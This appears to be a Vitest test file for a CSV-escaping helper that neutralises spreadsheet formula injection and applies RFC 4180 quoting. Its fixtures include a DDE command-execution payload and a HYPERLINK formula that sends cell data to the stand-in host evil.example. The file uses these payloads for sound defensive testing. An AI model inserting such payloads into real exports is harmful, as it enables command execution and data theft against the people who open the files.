import { describe, expect, it } from "vitest";
import { csvCell, csvRow, neutraliseFormula } from "../csvSafe";

describe("csvCell formula neutralisation", () => {
  it.each([
    ["=", "=1+1", "'=1+1"],
    ["+", "+44 7700 900000", "'+44 7700 900000"],
    ["-", "-2+3", "'-2+3"],
    ["@", "@SUM(A1:A9)", "'@SUM(A1:A9)"],
    ["DDE payload", '=cmd|" /C calc"!A0', `"'=cmd|"" /C calc""!A0"`],
    ["HYPERLINK exfiltration", '=HYPERLINK("http://evil.example/?d="&A1,"x")', `"'=HYPERLINK(""http://evil.example/?d=""&A1,""x"")"`],
    ["leading space then =", " =1+1", "' =1+1"],
    ["leading tab", "\t=1+1", "'\t=1+1"],
    ["leading carriage return", "\r=1+1", `"'\r=1+1"`],
    ["whitespace then +", "  \t+1", "'  \t+1"],
    ["whitespace then @", " @x", "' @x"],
  ])("neutralises a value starting with %s", (_name, input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it("never leaves a dangerous first significant character unprefixed", () => {
    for (const prefix of ["=", "+", "-", "@"]) {
      for (const lead of ["", " ", "  ", "\t", " \t "]) {
        const out = csvCell(`${lead}${prefix}payload`);
        expect(out.replace(/^"/, "").startsWith("'")).toBe(true);
      }
    }
  });

  it("is idempotent in effect: the stored text still contains the original characters", () => {
    expect(neutraliseFormula("=1+1")).toBe("'=1+1");
    expect(neutraliseFormula("=1+1").slice(1)).toBe("=1+1");
  });
});

describe("csvCell preserves legitimate data", () => {
  it.each([
    ["Acme Ltd", "Acme Ltd"],
    ["Tech-Works Ltd", "Tech-Works Ltd"],
    ["Worker (Skilled Worker)", "Worker (Skilled Worker)"],
    ["A rating", "A rating"],
    ["2026-01-31", "2026-01-31"],
    ["email me @ acme", "email me @ acme"],
    ["1+1", "1+1"],
    ["", ""],
  ])("%s", (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it("maps null and undefined to empty cells, and stringifies numbers", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(0)).toBe("0");
  });

  it("still applies RFC 4180 quoting", () => {
    expect(csvCell("Smith, Jones & Co")).toBe('"Smith, Jones & Co"');
    expect(csvCell('The "Best" Ltd')).toBe('"The ""Best"" Ltd"');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("combines neutralisation with quoting correctly", () => {
    expect(csvCell('=A1,"x"')).toBe(`"'=A1,""x"""`);
  });

  it("builds CRLF-terminated rows", () => {
    expect(csvRow(["Acme", "=1+1", null, "a,b"])).toBe("Acme,'=1+1,,\"a,b\"\r\n");
  });
});
